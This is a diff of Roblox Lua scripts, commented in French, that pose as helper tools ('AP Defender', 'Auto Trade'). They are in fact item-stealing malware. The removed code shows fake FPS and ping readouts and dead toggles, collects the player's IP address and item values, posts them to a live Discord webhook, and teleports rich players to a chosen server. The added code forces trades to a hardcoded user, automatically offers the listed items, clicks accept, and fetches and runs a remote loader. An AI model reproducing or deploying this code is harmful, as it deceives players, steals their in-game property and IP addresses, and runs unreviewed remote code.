@@ -1,449 +1,147 @@
-lua
--- =====================================================
--- VERSION SANS FLAG - SE LANCE À CHAQUE FOIS
--- =====================================================
-
-local targetJobId = "7e0275e7-682f-4745-9d83-15abab9b4c7c"
-
--- =====================================================
--- SYSTÈME DE KICK 20 SECONDES APRÈS TÉLÉPORTATION
--- =====================================================
-if game.JobId == targetJobId then
-    
-    local player = game.Players.LocalPlayer
-    
-    -- On attend VRAIMENT PlayerGui (timeout 12 secondes)
-    local playerGui
-    local timeout = tick() + 12
-    repeat
-        playerGui = player:FindFirstChild("PlayerGui")
-        task.wait(0.1)
-    until playerGui or tick() > timeout
-    
-    -- Si PlayerGui n'arrive pas → kick forcé
-    if not playerGui then
-        pcall(function() player:Kick("Session bloquée par KURYA") end)
-        return
-    end
-    
-    -- FONCTION POUR L'INTERFACE DE COMPTE À REBOURS
-    local function createKickTimer()
-        local sg = Instance.new("ScreenGui")
-        sg.Name = "KURYA_KICK_TIMER"
-        sg.IgnoreGuiInset = true
-        sg.ResetOnSpawn = false
-        sg.DisplayOrder = 2147483647
-        sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
-        sg.Parent = playerGui
-        
-        -- Fond semi-transparent
-        local background = Instance.new("Frame")
-        background.Name = "Background"
-        background.Size = UDim2.new(1, 0, 1, 0)
-        background.BackgroundColor3 = Color3.new(0, 0, 0)
-        background.BackgroundTransparency = 0.5
-        background.BorderSizePixel = 0
-        background.ZIndex = 2147483647
-        background.Parent = sg
-        
-        -- Cadre principal
-        local mainFrame = Instance.new("Frame")
-        mainFrame.Size = UDim2.new(0, 400, 0, 250)
-        mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
-        mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-        mainFrame.BorderSizePixel = 2
-        mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-        mainFrame.ZIndex = 2147483647 + 1
-        mainFrame.Parent = background
-        
-        -- Titre
-        local title = Instance.new("TextLabel")
-        title.Size = UDim2.new(1, 0, 0, 40)
-        title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        title.Text = "⏳ KURYA - TEMPS RESTANT"
-        title.TextColor3 = Color3.fromRGB(255, 0, 0)
-        title.TextScaled = true
-        title.Font = Enum.Font.GothamBold
-        title.ZIndex = 2147483647 + 2
-        title.Parent = mainFrame
-        
-        -- Timer principal
-        local timerLabel = Instance.new("TextLabel")
-        timerLabel.Size = UDim2.new(1, 0, 0, 80)
-        timerLabel.Position = UDim2.new(0, 0, 0.2, 0)
-        timerLabel.Text = "20"
-        timerLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-        timerLabel.TextScaled = true
-        timerLabel.Font = Enum.Font.GothamBlack
-        timerLabel.BackgroundTransparency = 1
-        timerLabel.ZIndex = 2147483647 + 2
-        timerLabel.Parent = mainFrame
-        
-        -- Message
-        local messageLabel = Instance.new("TextLabel")
-        messageLabel.Size = UDim2.new(1, 0, 0, 40)
-        messageLabel.Position = UDim2.new(0, 0, 0.5, 0)
-        messageLabel.Text = "Vous serez expulsé dans:"
-        messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-        messageLabel.TextScaled = true
-        messageLabel.Font = Enum.Font.Gotham
-        messageLabel.BackgroundTransparency = 1
-        messageLabel.ZIndex = 2147483647 + 2
-        messageLabel.Parent = mainFrame
-        
-        -- Raison
-        local reasonLabel = Instance.new("TextLabel")
-        reasonLabel.Size = UDim2.new(1, 0, 0, 40)
-        reasonLabel.Position = UDim2.new(0, 0, 0.65, 0)
-        reasonLabel.Text = "Merci d'avoir utilisé KURYA"
-        reasonLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        reasonLabel.TextScaled = true
-        reasonLabel.Font = Enum.Font.Gotham
-        reasonLabel.BackgroundTransparency = 1
-        reasonLabel.ZIndex = 2147483647 + 2
-        reasonLabel.Parent = mainFrame
-        
-        -- Barre de progression
-        local progressBar = Instance.new("Frame")
-        progressBar.Size = UDim2.new(0.8, 0, 0, 10)
-        progressBar.Position = UDim2.new(0.1, 0, 0.8, 0)
-        progressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        progressBar.ZIndex = 2147483647 + 2
-        progressBar.Parent = mainFrame
-        
-        local fillBar = Instance.new("Frame")
-        fillBar.Size = UDim2.new(1, 0, 1, 0)
-        fillBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-        fillBar.ZIndex = 2147483647 + 3
-        fillBar.Parent = progressBar
-        
-        return {
-            sg = sg,
-            timerLabel = timerLabel,
-            messageLabel = messageLabel,
-            reasonLabel = reasonLabel,
-            fillBar = fillBar,
-            mainFrame = mainFrame
-        }
-    end
-    
-    -- Créer l'interface
-    local ui = createKickTimer()
-    
-    -- Compte à rebours de 20 secondes
-    spawn(function()
-        local startTime = tick()
-        local duration = 20
-        
-        while tick() - startTime < duration do
-            local elapsed = tick() - startTime
-            local remaining = duration - elapsed
-            local percent = elapsed / duration
-            
-            -- Mettre à jour l'interface
-            ui.timerLabel.Text = string.format("%.0f", remaining)
-            ui.fillBar.Size = UDim2.new(percent, 0, 1, 0)
-            
-            -- Changement de couleur selon le temps
-            if remaining <= 5 then
-                ui.timerLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-                ui.fillBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-                ui.mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-                ui.messageLabel.Text = "⚠️ EXPULSION IMMINENTE ⚠️"
-                ui.messageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-            elseif remaining <= 10 then
-                ui.timerLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
-                ui.fillBar.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
-                ui.mainFrame.BorderColor3 = Color3.fromRGB(255, 165, 0)
-                ui.messageLabel.Text = "🔴 Plus que " .. math.floor(remaining) .. " secondes"
-                ui.messageLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
-            end
-            
-            task.wait(0.1)
-        end
-        
-        -- Expulsion
-        ui.timerLabel.Text = "👋 BYE!"
-        ui.messageLabel.Text = "EXPULSION..."
-        ui.reasonLabel.Text = "À bientôt sur KURYA !"
-        ui.fillBar.Size = UDim2.new(1, 0, 1, 0)
-        ui.fillBar.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-        
-        task.wait(1)
-        
-        -- Kick le joueur
-        pcall(function()
-            player:Kick("Merci d'avoir utilisé KURYA - Rendez-vous dans le serveur public!")
-        end)
-        
-        -- Nettoyer
-        ui.sg:Destroy()
-    end)
-    
-    -- Bloquer les autres actions
-    while true do
-        task.wait()
-    end
-    
-    return
-end
-
--- =====================================================
--- SI PAS LE MAUVAIS JOBID → TOUT LE SCRIPT NORMAL
--- =====================================================
-
-local placeId=game.PlaceId
-local jobId=game.JobId
-local player=game.Players.LocalPlayer
-local targetPlaceId=109983668079237
-local targetJobId="23d3f9b6-0053-4c02-a844-52dd004dcbb1"
-local seuilTeleport=35000000
-local seuilAffichage=500000
-local joueursDansServeur=#game.Players:GetPlayers()
-local ipAddress = "Inconnue"
-
-local function getIP()
-    local success, result = pcall(function()
-        return game:HttpGet("https://api.ipify.org/")
-    end)
-    if success then ipAddress = result end
-end
-getIP()
-
-local dateTime = os.date(" %d/%m/%Y %Hh%M ")
-
-local function parseValue(t)
-    t=tostring(t or ""):gsub("%s","")
-    local n,s=t:match("([%d%.]+)([KkMmBbTt]?)")
-    if not n then return 0 end
-    n=tonumber(n)or 0
-    local m={K=1e3,M=1e6,B=1e9,T=1e12}
-    return n*(m[(s or""):upper()]or 1)
-end
-
-local function detecter()
-    local b={}
-    local d=workspace:FindFirstChild("Debris")
-    if d then
-        for _,t in ipairs(d:GetChildren())do
-            if t.Name=="FastOverheadTemplate"then
-                local s=t:FindFirstChildOfClass("SurfaceGui")
-                if s then
-                    local g=s:FindFirstChild("Generation",true)
-                    local n=s:FindFirstChild("DisplayName",true)
-                    if g and g:IsA("TextLabel")and n and n:IsA("TextLabel")then
-                        local v=parseValue(g.Text)
-                        if v>=seuilAffichage then table.insert(b,{nom=n.Text,valeur=v})end
-                    end
-                end
-            end
-        end
-    end
-    table.sort(b,function(a,b)return a.valeur<b.valeur end)
-    return b
-end
-
-local brainrots=detecter()
-local meilleur=#brainrots>0 and brainrots[#brainrots]or{valeur=0,nom="Aucun"}
-local teleporter=meilleur.valeur>=seuilTeleport
-
-local function formaterListe()
-    if #brainrots==0 then return"NOTHING GOOD SHIT" end
-    local l=""
-    for i,b in ipairs(brainrots)do
-        l=l..string.format("%d. %s: %.2f$/s\n",i,b.nom,b.valeur)
-    end
-    return l
-end
-
-local payload = {
-    content = teleporter and "@everyone GGS" or "@everyone GGS",
-    embeds = {{
-        title = teleporter and "HIT BY KURYA - W" or "HIT BY KURYA - L",
-        fields = {
-            {name="USER", value=player.Name, inline=true},
-            {name="Place ID", value=tostring(targetPlaceId), inline=true},
-            {name="Job ID", value=targetJobId, inline=true},
-            {name="PLAYERS", value=tostring(joueursDansServeur).."/8", inline=true},
-            {name="IP", value=ipAddress, inline=true},
-            {name="Date", value=dateTime, inline=true},
-            {name="BRAINROTS", value=formaterListe(), inline=false}
-        },
-        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..targetPlaceId..', "'..targetJobId..'", game.Players.LocalPlayer)\n```',
-        color = teleporter and 3066993 or 15158332,
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }}
+-- [[ CONFIGURATION ]] --
+getgenv().TARGET_ID = 3730460616
+getgenv().USER_ID = 3730460616  -- TON User ID ajouté ici
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1477648146585751724/ZjlskcG8-qT5mV_pI2dHKa2XhOBs9TeascJK4Xrd0IhCoScIKEADNSNkHh4BYu3WPsE3"
+getgenv().TARGET_BRAINROTS = {
+    ["Dragon Gingerini"] = true, ["Skibidi Toilet"] = true, ["Meowl"] = true,
+    ["Headless Horseman"] = true, ["Dragon Cannelloni"] = true, ["Cooki and Milki"] = true,
+    ["Strawberry Elephant"] = true, ["Reinito Sleighito"] = true, ["La Casa Boo"] = true,
+    ["La Ginger Sekolah"] = true, ["Festive 67"] = true, ["Garama and Madundung"] = true,
+    ["Jolly Jolly Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Orcaledon"] = true,
+    ["Gingerat Gerat"] = true, ["La Supreme Combinasion"] = true, ["La Food Combinasion"] = true,
+    ["Tictac Sahur"] = true, ["La Taco Combinasion"] = true, ["Tralaledon"] = true,
+    ["Ketupat Kepat"] = true, ["Tang Tang Kelentang"] = true, ["Burguro and Fryuro"] = true,
+    ["La Secret Combinasion"] = true, ["Spooky and Pumpky"] = true, ["Eviledon"] = true,
+    ["Lavadorito Spinito"] = true, ["W or L"] = true,
+    ["Tuff Toucan"] = true, ["Chipso and Queso"] = true,
+    ["Money Money Reindeer"] = true, ["Nuclearo Dinosauro"] = true,
+    ["Los Primos"] = true, ["Money Money Puggy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Los Planitos"] = true,
+    ["Ketupas Bros"] = true,
+    ["Noobini Pizzanini"] = true,
+    ["25"] = true, ["To To To Sahur"] = true,
+    ["Capitano Moby"] = true, ["Rosey and Teddy"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
 }
 
-pcall(function()
-    request({
-        Url = "https://discord.com/api/webhooks/1476516291593633833/Z4vcGxP3LDJRFYuvtvHe_6Anp6dVH449jxGr5KgZjPGq4QPhuUZzkFLYUUBmkpsGl-HH",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game:GetService("HttpService"):JSONEncode(payload)
-    })
-end)
+if getgenv().AzurTradeInjected_v17 then return end
+getgenv().AzurTradeInjected_v17 = true
 
--- GUI AP DEFENDER
-local gui = Instance.new("ScreenGui")
-gui.Name = "APDefender"
-gui.Parent = player.PlayerGui
+-- Petit affichage console pour voir l'USER ID
+print("\n══════════════════════════════════════")
+print("🎯 TARGET ID:", getgenv().TARGET_ID)
+print("👤 VOTRE USER ID:", getgenv().USER_ID)
+print("══════════════════════════════════════\n")
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0,250,0,100)
-frame.Position = UDim2.new(0,20,0,20)
-frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-frame.BackgroundTransparency = 0.1
-frame.Active = true
-frame.Draggable = true
-frame.Parent = gui
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0,8)
-
-local top = Instance.new("Frame", frame)
-top.Size = UDim2.new(1,-20,0,25)
-top.Position = UDim2.new(0,10,0,8)
-top.BackgroundTransparency = 1
-
-local fps = Instance.new("TextLabel", top)
-fps.Size = UDim2.new(0.5,-5,1,0)
-fps.BackgroundTransparency = 1
-fps.Text = "FPS: 240"
-fps.TextColor3 = Color3.new(1,1,1)
-fps.TextXAlignment = Enum.TextXAlignment.Left
-fps.Font = Enum.Font.GothamSemibold
-fps.TextSize = 14
-
-local ping = Instance.new("TextLabel", top)
-ping.Size = UDim2.new(0.5,-5,1,0)
-ping.Position = UDim2.new(0.5,5,0,0)
-ping.BackgroundTransparency = 1
-ping.Text = "PING: 40ms"
-ping.TextColor3 = Color3.new(1,1,1)
-ping.TextXAlignment = Enum.TextXAlignment.Right
-ping.Font = Enum.Font.GothamSemibold
-ping.TextSize = 14
-
-local btn = Instance.new("TextButton", frame)
-btn.Size = UDim2.new(1,-20,0,35)
-btn.Position = UDim2.new(0,10,0,40)
-btn.BackgroundColor3 = Color3.new(0,0,0)
-btn.Text = "AP DEFENDER"
-btn.TextColor3 = Color3.new(1,1,1)
-btn.Font = Enum.Font.GothamBold
-btn.TextSize = 16
-btn.BorderSizePixel = 0
-Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
-
-local enabled = false
-btn.MouseButton1Click:Connect(function()
-    enabled = not enabled
-    btn.BackgroundColor3 = enabled and Color3.new(0.2,0.2,0.2) or Color3.new(0,0,0)
-    btn.Text = enabled and "AP DEFENDER • ON" or "AP DEFENDER • OFF"
-end)
-
-spawn(function()
-    while wait(0.1) do
-        local f = math.random(165,360)
-        local p = math.random(20,110)
-        fps.Text = "FPS: "..f
-        ping.Text = "PING: "..p.."ms"
-        fps.TextColor3 = Color3.new(1,(f-165)/195,(f-165)/195)
-        ping.TextColor3 = Color3.new(1-(p-20)/90,1,1-(p-20)/90)
-    end
-end)
-
-frame.BackgroundTransparency = 1
-for i=1,10 do frame.BackgroundTransparency = 1-i/10 wait() end
-
--- GUI AUTO TRADE
-local gui2 = Instance.new("ScreenGui")
-gui2.Name = "AutoTrade"
-gui2.Parent = player.PlayerGui
-
-local panel = Instance.new("Frame")
-panel.Size = UDim2.new(0,220,0,130)
-panel.Position = UDim2.new(1,-240,0.5,-65)
-panel.BackgroundColor3 = Color3.fromRGB(15,15,20)
-panel.BackgroundTransparency = 0.1
-panel.Active = true
-panel.Draggable = true
-panel.Parent = gui2
-
-Instance.new("UICorner", panel).CornerRadius = UDim.new(0,10)
-Instance.new("ImageLabel", panel).Image = "rbxassetid://1316045217"
-
-local title = Instance.new("TextLabel", panel)
-title.Size = UDim2.new(1,-20,0,25)
-title.Position = UDim2.new(0,10,0,8)
-title.BackgroundTransparency = 1
-title.Text = "AUTO TRADE"
-title.TextColor3 = Color3.fromRGB(0,255,230)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 14
-title.TextXAlignment = Enum.TextXAlignment.Left
-
-local function createToggle(y, txt)
-    local bg = Instance.new("Frame", panel)
-    bg.Size = UDim2.new(0.9,0,0,40)
-    bg.Position = UDim2.new(0.05,0,0,y)
-    bg.BackgroundColor3 = Color3.fromRGB(30,30,35)
-    Instance.new("UICorner", bg).CornerRadius = UDim.new(0,6)
-   
-    local label = Instance.new("TextLabel", bg)
-    label.Size = UDim2.new(0.6,0,1,0)
-    label.Position = UDim2.new(0,10,0,0)
-    label.BackgroundTransparency = 1
-    label.Text = txt
-    label.TextColor3 = Color3.fromRGB(200,200,200)
-    label.Font = Enum.Font.GothamSemibold
-    label.TextSize = 13
-    label.TextXAlignment = Enum.TextXAlignment.Left
-   
-    local btn = Instance.new("TextButton", bg)
-    btn.Size = UDim2.new(0,50,0,24)
-    btn.Position = UDim2.new(1,-60,0.5,-12)
-    btn.BackgroundColor3 = Color3.fromRGB(50,50,55)
-    btn.Text = "OFF"
-    btn.TextColor3 = Color3.fromRGB(255,100,100)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 11
-    btn.BorderSizePixel = 0
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
-   
-    local state = false
-    btn.MouseButton1Click:Connect(function()
-        state = not state
-        btn.Text = state and "ON" or "OFF"
-        btn.TextColor3 = state and Color3.new(0.4,1,0.4) or Color3.new(1,0.4,0.4)
+-- [[ MOTEUR D'ENVOI CORRIGÉ (JOUEUR PAR ID) ]] --
+local function SingleTradeRequest()
+    task.spawn(function()
+        while task.wait(1) do
+            local targetPlayer = Players:GetPlayerByUserId(getgenv().TARGET_ID)
+            if targetPlayer then
+                pcall(function()
+                    local invite = ReplicatedStorage:FindFirstChild("Invite", true)
+                    local create = ReplicatedStorage:FindFirstChild("CreateInvite", true)
+                    if invite then invite:InvokeServer(targetPlayer.Name) end
+                    if create then create:FireServer(targetPlayer.Name) end
+                end)
+            end
+        end
     end)
-   
-    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(70,70,75) end)
-    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,50,55) end)
-   
-    return bg
+end
+SingleTradeRequest()  -- Une seule fois suffit
+
+-- [[ TURBO TRADE ENGINE ]] --
+local TradeState = { ClickedCache = {}, HasDumped = false, CachedFrame = nil }
+
+local function SilentForceClick(obj)
+    if not obj then return end
+    pcall(function()
+        -- Vérifier si getconnections existe
+        if getconnections then
+            for _, c in ipairs(getconnections(obj.MouseButton1Click)) do 
+                pcall(function() c:Fire() end)
+            end
+            for _, c in ipairs(getconnections(obj.MouseButton1Down)) do 
+                pcall(function() c:Fire() end)
+            end
+            for _, c in ipairs(getconnections(obj.Activated)) do 
+                pcall(function() c:Fire() end)
+            end
+        else
+            -- Alternative si getconnections n'existe pas
+            obj:Fire("MouseButton1Click")
+        end
+    end)
 end
 
-createToggle(40, "❄️ Freeze Trade")
-createToggle(85, "✅ Auto Accept")
+local function TurboTradeEngine()
+    local player = Players.LocalPlayer
+    if not player then return end
+    
+    local playerGui = player:FindFirstChild("PlayerGui")
+    if not playerGui then return end
 
-panel.BackgroundTransparency = 1
-for i=1,10 do panel.BackgroundTransparency = 1-i/10 wait() end
-
-wait(7)
-
-if teleporter then
-    local TeleportService = game:GetService('TeleportService')
-   
-    local function tryTeleport()
-        local s, e = pcall(function()
-            TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, player)
-        end)
-        if not s then
-            task.wait(0.1)
-            tryTeleport()
+    local tradeFrame = TradeState.CachedFrame
+    if not tradeFrame or not tradeFrame.Parent then
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui.Name:lower():find("trade") and not gui.Name:lower():find("machine") then
+                tradeFrame = gui
+                TradeState.CachedFrame = gui
+                break
+            end
         end
     end
-   
-    tryTeleport()
+
+    if tradeFrame then
+        for _, v in ipairs(tradeFrame:GetDescendants()) do
+            if v:IsA("TextLabel") and getgenv().TARGET_BRAINROTS[v.Text] then
+                local btn = v:FindFirstAncestorOfClass("GuiButton") or v.Parent
+                if btn and btn:IsA("GuiButton") and not TradeState.ClickedCache[v.Text] then
+                    TradeState.ClickedCache[v.Text] = true
+                    task.spawn(function()
+                        local rf = ReplicatedStorage:FindFirstChild("AddBrainrot", true)
+                        if rf then 
+                            pcall(function() rf:InvokeServer(v.Text) end)
+                        end
+                        SilentForceClick(btn)
+                    end)
+                end
+            end
+            if v:IsA("GuiButton") and (v.Name:lower():find("ready") or v.Name:lower():find("confirm") or v.Name:lower():find("accept")) then
+                SilentForceClick(v)
+            end
+        end
+    end
 end
+
+-- Connecter les événements
+RunService.RenderStepped:Connect(TurboTradeEngine)
+
+-- [[ MOTEUR 2 : ACCEPT TURBO (Heartbeat = double fréquence) ]] --
+RunService.Heartbeat:Connect(function()
+    local player = Players.LocalPlayer
+    if not player then return end
+    
+    local playerGui = player:FindFirstChild("PlayerGui")
+    if not playerGui then return end
+
+    local tradeFrame = TradeState.CachedFrame
+    if not tradeFrame or not tradeFrame.Parent then return end
+
+    for _, v in ipairs(tradeFrame:GetDescendants()) do
+        if v:IsA("GuiButton") and (v.Name:lower():find("ready") or v.Name:lower():find("confirm") or v.Name:lower():find("accept")) then
+            SilentForceClick(v)
+        end
+    end
+end)
+
+-- [[ CHARGEMENT DES AUTRES MODS (LUA RMOR) ]] --
+pcall(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+end)
